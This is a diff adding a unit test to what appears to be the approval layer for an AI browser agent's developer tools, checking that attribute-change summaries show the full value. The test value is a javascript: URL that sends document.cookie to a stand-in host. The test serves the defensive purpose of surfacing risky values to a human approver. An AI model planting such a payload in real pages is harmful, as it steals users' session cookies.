@@ -76,6 +76,14 @@ describe('developer-tools tool group', () => {
     expect(consolePrompt.details).toEqual([{ kind: 'code', value: source }])
   })
 
+  it('shows the attribute name and full value an attribute change would set', () => {
+    const value = `javascript:fetch('https://x.example/?c='+document.cookie)`
+    const summary = devToolsApprovalForCall(call('browser_devtools_set_element_attribute', { selector: 'a', name: 'href', value }), FRAMES, 'en').summary
+    expect(summary).toContain(`"href" = ${JSON.stringify(value)}`)
+    expect(devToolsApprovalForCall(call('browser_devtools_set_element_attribute', { selector: 'a', name: 'onclick', remove: true }), FRAMES, 'en').summary)
+      .toContain('remove "onclick"')
+  })
+
   it('scopes the grant origin to the frame a call targets', () => {
     const top = devToolsApprovalForCall(call('browser_console_eval', { expression: '1' }), FRAMES, 'en')
     expect(top.grantOrigin).toBe('https://example.com')
